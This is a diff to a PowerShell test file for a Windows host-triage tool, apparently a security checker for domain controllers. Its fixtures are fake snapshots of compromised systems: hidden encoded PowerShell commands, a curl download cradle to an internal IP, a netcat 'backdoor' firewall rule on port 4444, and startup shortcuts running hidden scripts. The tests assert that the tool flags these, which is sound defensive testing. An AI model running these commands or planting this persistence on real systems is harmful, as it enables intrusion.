@@ -58,6 +58,7 @@ Txt $bad hosts @"
 127.0.0.1       localhost
 10.6.6.6        update.microsoft.com windowsupdate.com
 10.0.0.20       intranet.corp.local
+100.105.236.63  laptop.tail1e12ea.ts.net. laptop
 "@
 Csv $bad users @('Name','SID','Disabled','Lockout','PasswordRequired','PasswordExpires','Description') @(
     @('Administrator','S-1-5-21-1-2-3-500','False','False','True','False','Built-in account'),
@@ -101,7 +102,9 @@ Csv $bad processes @('ProcessId','ParentProcessId','Name','ExecutablePath','Comm
     @('3500','700','powershell.exe','C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe','powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA','20261111090000.000000-300','CORP\jsmith'),
     @('3600','3601','cmd.exe','C:\Windows\System32\cmd.exe','cmd.exe /c whoami','20261111090000.000000-300','IIS APPPOOL\Default'),
     @('3601','600','w3wp.exe','C:\Windows\System32\inetsrv\w3wp.exe','w3wp.exe -ap Default','20261111090000.000000-300','IIS APPPOOL\Default'),
-    @('3700','600','svchost.exe','C:\ProgramData\svchost.exe','C:\ProgramData\svchost.exe','20261111090000.000000-300','NT AUTHORITY\SYSTEM')
+    @('3700','600','svchost.exe','C:\ProgramData\svchost.exe','C:\ProgramData\svchost.exe','20261111090000.000000-300','NT AUTHORITY\SYSTEM'),
+    @('3800','3801','steamwebhelper.exe','C:\Program Files (x86)\Steam\bin\cef\cef.win64\steamwebhelper.exe','"C:\Program Files (x86)\Steam\bin\cef\cef.win64\steamwebhelper.exe" --type=crashpad-handler --url=https://crash.steampowered.com/submit','20261111090000.000000-300','CORP\jsmith'),
+    @('3900','700','powershell.exe','C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe','powershell -c "(New-Object IO.StreamReader((curl.exe -s https://10.6.6.6/x)))"','20261111090000.000000-300','CORP\jsmith')
 )
 Csv $bad services @('Name','DisplayName','State','StartMode','PathName','StartName','ProcessId') @(
     @('DNS','DNS Server','Running','Auto','C:\Windows\system32\dns.exe','LocalSystem','2100'),
@@ -145,9 +148,21 @@ Csv $bad registry @('Key','Name','Value') @(
     @('HKLM\SOFTWARE\Microsoft\NetSh','helper','C:\Windows\Temp\nethelp.dll'),
     @('HKLM\SOFTWARE\Policies\Microsoft\Windows Defender','DisableAntiSpyware','1'),
     @('HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths','C:\','0'),
-    @('HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths','D:\SQLData','0')
+    @('HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths','D:\SQLData','0'),
+    @('HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules','{AAAA-1}','v2.31|Action=Allow|Active=TRUE|Dir=In|Name=Allow All|'),
+    @('HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules','RemoteDesktop-UserMode-In-TCP','v2.31|Action=Allow|Active=TRUE|Dir=In|Protocol=6|LPort=3389|App=%SystemRoot%\system32\svchost.exe|Svc=termservice|Name=@FirewallAPI.dll,-28775|EmbedCtxt=@FirewallAPI.dll,-28752|'),
+    @('HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules','{AAAA-2}','v2.31|Action=Allow|Active=TRUE|Dir=In|Protocol=6|LPort=4444|App=C:\Windows\Temp\nc.exe|Name=backdoor|'),
+    @('HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules','{AAAA-3}','v2.31|Action=Allow|Active=TRUE|Dir=In|Name=@{Microsoft.LockApp_10.0.26100.9818_neutral__cw5n1h2txyewy?ms-resource://Microsoft.LockApp/resources/AppDisplayName}|PFN=Microsoft.LockApp_cw5n1h2txyewy|AppPkgId=S-1-15-2-1|'),
+    @('HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules','{AAAA-4}','v2.31|Action=Allow|Active=TRUE|Dir=In|Name=Tailscale-In|LA4=100.105.236.63|'),
+    @('HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules','{AAAA-5}','v2.31|Action=Allow|Active=FALSE|Dir=In|Name=Old allow all|'),
+    @('HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules','{AAAA-6}','v2.31|Action=Allow|Active=TRUE|Dir=In|Protocol=6|App=C:\Users\jsmith\AppData\Local\Discord\Discord.exe|Name=Discord|'),
+    @('HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\FirewallRules','{BBBB-1}','v2.31|Action=Allow|Active=TRUE|Dir=In|Name=GPO allow all|')
 )
-Csv $bad startup_files @('Path','LastWrite') @(,@('C:\Users\jsmith\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\run.bat','2026-11-11 09:00'))
+Csv $bad startup_files @('Path','LastWrite','Target') @(
+    @('C:\Users\jsmith\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\run.bat','2026-11-11 09:00',''),
+    @('C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Tailscale.lnk','2026-11-01 09:00','C:\Program Files\Tailscale\tailscale-ipn.exe'),
+    @('C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Helper.lnk','2026-11-11 09:00','C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -nop -f C:\Users\Public\h.ps1')
+)
 Csv $bad wmi_consumers @('Class','Name','Command') @(,@('CommandLine','Updater','C:\Windows\System32\cmd.exe /c C:\ProgramData\u.bat'))
 Csv $bad system_files @('Name','Path','Size','Sha256') @(
     @('sethc.exe','C:\Windows\System32\sethc.exe','289792','aaaa'),
@@ -162,6 +177,7 @@ Txt $bad schtasks @"
 "DC01","\SysHealth","11/12/2026 9:05:00 AM","Ready","Interactive/Background","N/A","1","CORP\jsmith","powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA","N/A","N/A","Enabled","Disabled","","SYSTEM","Disabled","72:00:00","Scheduling data is not available in this format.","Daily","9:00:00 AM","1/1/2026","N/A","Every 1 day(s)","N/A","Disabled","Disabled","Disabled","Disabled"
 "HostName","TaskName","Next Run Time","Status","Logon Mode","Last Run Time","Last Result","Author","Task To Run","Start In","Comment","Scheduled Task State","Idle Time","Power Management","Run As User","Delete Task If Not Rescheduled","Stop Task If Runs X Hours and X Mins","Schedule","Schedule Type","Start Time","Start Date","End Date","Days","Months","Repeat: Every","Repeat: Until: Time","Repeat: Until: Duration","Repeat: Stop If Still Running"
 "DC01","\Microsoft\Windows\Defrag\ScheduledDefrag","N/A","Ready","Interactive/Background","N/A","1","Microsoft","%windir%\system32\defrag.exe -c -h -o -$","N/A","N/A","Enabled","Disabled","","SYSTEM","Disabled","72:00:00","Scheduling data is not available in this format.","Weekly","1:00:00 AM","1/1/2026","N/A","SUN","N/A","Disabled","Disabled","Disabled","Disabled"
+"DC01","\Odd <chars>","N/A","Ready","Interactive/Background","N/A","1","Vendor","C:\Program Files\Vendor\tool.exe <arg> ""quoted|piped""","N/A","N/A","Enabled","Disabled","","SYSTEM","Disabled","72:00:00","x","Daily","9:00:00 AM","1/1/2026","N/A","Every 1 day(s)","N/A","Disabled","Disabled","Disabled","Disabled"
 "DC01","\Cleanup","N/A","Ready","Interactive/Background","N/A","1","CORP\jsmith","C:\Users\Public\clean.exe","N/A","N/A","Enabled","Disabled","","SYSTEM","Disabled","72:00:00","Scheduling data is not available in this format.","Daily","9:00:00 AM","1/1/2026","N/A","Every 1 day(s)","N/A","Disabled","Disabled","Disabled","Disabled"
 "@
 Txt $bad auditpol @"
@@ -192,62 +208,6 @@ State                                 ON
 Firewall Policy                       BlockInbound,AllowOutbound
 Ok.
 "@
-Txt $bad fw_rules @"
-
-Rule Name:                            Allow All
-----------------------------------------------------------------------
-Enabled:                              Yes
-Direction:                            In
-Profiles:                             Domain,Private,Public
-Grouping:
-LocalIP:                              Any
-RemoteIP:                             Any
-Protocol:                             Any
-Edge traversal:                       No
-Program:                              Any
-InterfaceTypes:                       Any
-Security:                             NotRequired
-Rule source:                          Local Setting
-Action:                               Allow
-
-Rule Name:                            Remote Desktop - User Mode (TCP-In)
-----------------------------------------------------------------------
-Enabled:                              Yes
-Direction:                            In
-Profiles:                             Domain,Private,Public
-Grouping:                             Remote Desktop
-LocalIP:                              Any
-RemoteIP:                             Any
-Protocol:                             TCP
-LocalPort:                            3389
-RemotePort:                           Any
-Edge traversal:                       No
-Program:                              %SystemRoot%\system32\svchost.exe
-Service:                              termservice
-InterfaceTypes:                       Any
-Security:                             NotRequired
-Rule source:                          Local Setting
-Action:                               Allow
-
-Rule Name:                            backdoor
-----------------------------------------------------------------------
-Enabled:                              Yes
-Direction:                            In
-Profiles:                             Domain,Private,Public
-Grouping:
-LocalIP:                              Any
-RemoteIP:                             Any
-Protocol:                             TCP
-LocalPort:                            4444
-RemotePort:                           Any
-Edge traversal:                       No
-Program:                              C:\Windows\Temp\nc.exe
-InterfaceTypes:                       Any
-Security:                             NotRequired
-Rule source:                          Local Setting
-Action:                               Allow
-Ok.
-"@
 Csv $bad defender_status @('AMServiceEnabled','AntivirusEnabled','RealTimeProtectionEnabled','BehaviorMonitorEnabled','IsTamperProtected','AntivirusSignatureLastUpdated') @(,@('True','True','False','True','False','11/10/2026 3:00:00 AM'))
 Csv $bad defender_prefs @('DisableRealtimeMonitoring','ExclusionPath','ExclusionProcess','ExclusionExtension') @(,@('True','C:\|D:\SQLData','','ps1'))
 Csv $bad shares @('Name','Path','Type','Description') @(
@@ -262,18 +222,23 @@ Csv $bad events @('Time','Log','Id','Detail') @(
     @('2026-11-11 09:10:00','Security','1102','Account Name=jsmith'),
     @('2026-11-11 09:00:00','Security','4720','Account Name=jsmith; Account Name=svc_backup$'),
     @('2026-11-11 09:01:00','Security','4732','Account Name=jsmith; Group Name=Administrators'),
-    @('2026-11-11 09:02:00','System','7045','Service Name=WinUpdSvc; Service File Name=cmd.exe /c powershell')
+    @('2026-11-11 09:02:00','System','7045','Service Name=WinUpdSvc; Service File Name=cmd.exe /c powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA'),
+    @('2026-11-11 09:03:00','System','7045','Service Name=MpKslDrv; Service File Name=C:\ProgramData\Microsoft\Windows Defender\Definition Updates\x\MpKslDrv.sys'),
+    @('2026-11-11 13:06:38','System','7045','Service Name=D; Service File Name=C:\Windows\TEMP\D.sys'),
+    @('2026-11-11 13:07:49','System','7045','Service Name=D; Service File Name=C:\Windows\TEMP\D.sys'),
+    @('2026-11-11 14:21:39','System','7045','Service Name=D; Service File Name=C:\Windows\TEMP\D.sys')
 )
 Csv $bad drivers @('Name','DisplayName','State','StartMode','PathName') @(
     @('disk','Disk Driver','Running','Boot','C:\Windows\system32\drivers\disk.sys'),
-    @('evil','evil','Running','System','C:\Users\Public\evil.sys')
+    @('evil','evil','Running','System','C:\Users\Public\evil.sys'),
+    @('D','D','Stopped','Manual','\??\C:\Windows\TEMP\D.sys')
 )
 Txt $bad user_rights @"
 [Unicode]
 Unicode=yes
 [Privilege Rights]
 SeDebugPrivilege = *S-1-5-32-544,*S-1-5-21-1-2-3-1106
-SeImpersonatePrivilege = *S-1-5-19,*S-1-5-20,*S-1-5-32-544,*S-1-5-6
+SeImpersonatePrivilege = *S-1-5-19,*S-1-5-20,*S-1-5-32-544,*S-1-5-6,*S-1-5-99-216390572-1995538116-3857911515-2404958512-2623887229
 SeRemoteInteractiveLogonRight = *S-1-5-32-544,*S-1-1-0
 "@
 Csv $bad features @('ID','Name') @(@('10','Active Directory Domain Services'), @('13','DNS Server'))
@@ -345,6 +310,7 @@ T-Has $sum 'Listening TCP' 'summary: listening ports'
 # system
 T-Has $fl '"HIGH","system","hosts: update.microsoft.com windowsupdate.com"' 'hosts file redirecting Microsoft update is HIGH'
 T-Has $fl '"MED","system","hosts: intranet.corp.local"' 'other hosts entries are MED'
+T-Has $fl '"LOW","system","hosts: laptop.tail1e12ea.ts.net. laptop"' 'Tailscale hosts entries are LOW'
 # users
 T-Has $fl '"HIGH","users","Guest","the Guest account is enabled"' 'Guest enabled'
 T-Has $fl '"HIGH","users","svc_backup$"' 'hidden $ account'
@@ -354,7 +320,7 @@ T-Has $fl '"HIGH","users","CORP\Domain Users"' 'Domain Users in Administrators i
 T-Has $fl '"LOW","users","CORP\mark.jacobs","member of Remote Desktop Users"' 'RDP users listed'
 # ports and connections
 T-Has $fl '"HIGH","ports","4444/tcp nc.exe"' 'nc listening'
-T-Has $fl '"HIGH","ports","8080/tcp updater.exe","listening program runs from an unusual folder' 'listener from AppData'
+T-Has $fl '"MED","ports","8080/tcp updater.exe","listening program runs from an unusual folder' 'listener from AppData is MED (desktop apps live there)'
 T-Has $fl '"HIGH","ports","2323/tcp powershell.exe"' 'powershell listening'
 T-HasNot $fl '"ports","445/tcp System"' 'normal SMB listener not flagged'
 T-Has $fl '"HIGH","connections","cmd.exe -> 10.6.6.6:443"' 'cmd.exe with a live connection'
@@ -370,7 +336,7 @@ T-Has $fl '"HIGH","services","EventLog","Windows Event Log is Stopped"' 'event l
 # autostart
 T-Has $fl '"HIGH","autostart","Updater","Run key starts a suspicious command' 'Run key with a download cradle'
 T-Has $fl '"LOW","autostart","VMware Tools"' 'normal Run key is LOW'
-T-Has $fl '"HIGH","autostart","OneDriveHelper"' 'user Run key from AppData'
+T-Has $fl '"MED","autostart","OneDriveHelper"' 'user Run key from AppData is MED'
 T-Has $fl '"HIGH","autostart","Winlogon Userinit"' 'Userinit with an extra program'
 T-HasNot $fl '"Winlogon Shell"' 'normal Shell not flagged'
 T-Has $fl '"HIGH","autostart","sethc.exe","debugger set' 'sticky-keys debugger'
@@ -379,7 +345,9 @@ T-Has $fl 'unknown package loaded into lsass: evilssp' 'unknown LSA package'
 T-HasNot $fl 'into lsass: wdigest' 'default LSA packages not flagged'
 T-Has $fl '"MED","autostart","helper","unknown netsh helper DLL' 'unknown netsh helper'
 T-HasNot $fl '"ifmon"' 'default netsh helper not flagged'
-T-Has $fl '"MED","autostart","run.bat"' 'startup folder file'
+T-Has $fl '"HIGH","autostart","run.bat"' 'a script in a Startup folder is HIGH'
+T-Has $fl '"LOW","autostart","Tailscale.lnk"' 'a shortcut to an installed program is LOW'
+T-Has $fl '"HIGH","autostart","Helper.lnk"' 'a shortcut that starts hidden PowerShell is HIGH'
 T-Has $fl '"HIGH","autostart","WMI Updater"' 'WMI subscription'
 T-Has $fl '"HIGH","autostart","utilman.exe","C:\Windows\System32\utilman.exe has been replaced by cmd.exe' 'utilman replaced by cmd'
 T-HasNot $fl '"osk.exe"' 'unchanged accessibility program not flagged'
@@ -389,7 +357,8 @@ T-Has $fl '"HIGH","tasks","\Cleanup","task runs a program from an unusual folder
 T-Has $fl '"LOW","tasks","\GoogleUpdateTaskMachineCore"' 'third-party task is LOW'
 T-HasNot $fl 'ScheduledDefrag' 'Microsoft task not flagged'
 T-HasNot $fl '"TaskName"' 'repeated header lines are not tasks'
-T-Has $sum 'Scheduled tasks: 4 (3 outside \Microsoft\)' 'task count'
+T-Has $sum 'Scheduled tasks: 5 (4 outside \Microsoft\)' 'task count (a command with < > | and quotes does not stop the section)'
+T-HasNot $sum 'stopped early' 'no section stops early'
 # security
 T-Has $fl '"HIGH","security","WDigest UseLogonCredential"' 'WDigest on'
 T-Has $fl '"HIGH","security","UAC EnableLUA"' 'UAC off'
@@ -408,9 +377,16 @@ T-Has $fl '"MED","security","audit Logon"' 'logons not audited'
 # firewall
 T-Has $fl '"HIGH","firewall","firewall Domain","the Domain firewall profile is OFF"' 'profile off'
 T-Has $fl '"HIGH","firewall","firewall Private","the Private profile allows all inbound traffic by default"' 'allow-inbound default'
-T-Has $fl '"HIGH","firewall","Allow All","enabled inbound rule allows every port' 'allow-all rule'
-T-Has $fl '"HIGH","firewall","backdoor","inbound allow rule for an unusual program' 'rule for nc in Temp'
-T-HasNot $fl '"Remote Desktop - User Mode' 'normal RDP rule not flagged'
+T-Has $fl '"HIGH","firewall","Allow All","enabled inbound rule (local) allows every port' 'allow-all rule'
+T-Has $fl '"HIGH","firewall","GPO allow all","enabled inbound rule (policy) allows every port' 'allow-all rule from Group Policy'
+T-Has $fl '"HIGH","firewall","backdoor","inbound allow rule for an unusual program' 'rule for nc in Windows\Temp'
+T-HasNot $fl 'svchost.exe rule' 'normal RDP rule not flagged'
+T-HasNot $fl 'Microsoft.LockApp' 'a rule limited to one app package is not allow-all'
+T-HasNot $fl 'Tailscale-In' 'a rule limited to one local address is not allow-all'
+T-HasNot $fl 'Old allow all' 'a disabled rule is not flagged'
+T-Has $fl '"LOW","firewall","Discord"' 'a rule for a program in AppData is LOW'
+$fr = [IO.File]::ReadAllText((Join-Path $r.Dir 'firewall_rules.csv'))
+T-Has $fr '"Microsoft.LockApp","local","True","Allow","","","","","","AppPkgId PFN"' 'package rules are shortened and show what limits them'
 # defender
 T-Has $fl '"HIGH","defender","Defender","real-time protection is off"' 'real-time off'
 T-Has $fl '"HIGH","defender","Defender","DisableAntiSpyware = 1' 'policy turning Defender off'
@@ -426,15 +402,23 @@ T-HasNot $fl '"svchost.exe (1200)"' 'real svchost not flagged'
 T-Has $fl '"HIGH","processes","nc.exe (3300)"' 'netcat running'
 T-Has $fl '"HIGH","processes","powershell.exe (3500)","suspicious command line' 'encoded powershell'
 T-Has $fl '"HIGH","processes","cmd.exe (3600)","cmd.exe was started by w3wp.exe' 'web shell'
+T-HasNot $fl 'steamwebhelper' 'a browser-style program with a URL argument is not suspicious'
+T-Has $fl '"HIGH","processes","powershell.exe (3900)","suspicious command line' 'a shell with a URL is'
 # shares, software, updates, events, drivers, rights, roles
 T-Has $fl '"MED","shares","Public","\Everyone has Full access to share Public"' 'Everyone full on a share'
 T-HasNot $fl '"shares","NETLOGON"' 'default shares not flagged'
 T-Has $fl '"MED","software","AnyDesk"' 'remote-access tool'
 T-Has $fl '"HIGH","updates","updates","newest update is from 2020-05-20: this DC is probably open to Zerologon"' 'unpatched DC'
 T-Has $fl '"HIGH","events","2026-11-11 09:10:00 Security log cleared"' 'log cleared'
+T-Has $fl '"LOW","users","Guest","an empty password is allowed' 'password-not-required is LOW (it is set on many ordinary accounts)'
 T-Has $fl '"MED","events","2026-11-11 09:01:00 added to a local group","added to a local group: Account Name=jsmith; Group Name=Administrators"' 'admin added'
+T-Has $fl '"HIGH","events","2026-11-11 09:02:00 service installed"' 'suspicious service install is HIGH'
+T-Has $fl '"HIGH","events","service installed x3 (2026-11-11 13:06:38 to 2026-11-11 14:21:39)","service installed: Service Name=D; Service File Name=C:\Windows\TEMP\D.sys (a driver loaded from a temp folder' 'repeated events become one flag with a count'
+T-Eq ([regex]::Matches($fl, '"events","[^"]*","service installed: Service Name=D;').Count) 1 'only one events flag for the repeated driver install'
+T-Has $fl '"LOW","events","2026-11-11 09:03:00 service installed"' 'ordinary service install (an update) is LOW'
 T-Has $fl '"HIGH","drivers","evil"' 'driver from Users\Public'
 T-HasNot $fl '"drivers","disk"' 'normal driver not flagged'
+T-Has $fl '"MED","drivers","D","driver registered (not running now) from an unusual folder' 'a registered temp-folder driver is MED even when not running'
 T-Has $fl '"MED","rights","SeDebugPrivilege *S-1-5-21-1-2-3-1106"' 'debug right for a user'
 T-HasNot $fl 'SeImpersonatePrivilege' 'default impersonate holders not flagged'
 T-Has $fl '"HIGH","rights","SeRemoteInteractiveLogonRight *S-1-1-0"' 'RDP logon for Everyone'
